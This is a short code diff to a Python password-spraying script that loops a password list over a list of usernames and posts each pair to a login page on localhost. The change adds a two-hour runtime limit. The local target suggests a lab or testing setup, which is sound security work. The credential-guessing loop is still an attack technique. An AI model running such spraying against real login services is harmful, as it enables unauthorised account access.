@@ -1,10 +1,11 @@
 import requests
 import json
 import os
-import random
+import random 
+import time
 
 LOGIN_URL = "http://127.0.0.1:8000/login"
-
+MAX_RUNTIME_SECONDS = 7200
 usernames = [
     "user1",
     "user2",
@@ -36,8 +37,11 @@ def password_spraying():
     session = requests.Session()
     passwords = load_passwords()
     count_try =0
+    start_time = time.time()
     for password in passwords:
         for username in usernames:
+            if (time.time() - start_time) > MAX_RUNTIME_SECONDS:
+                return 
             
             r = session.post(
                 LOGIN_URL,
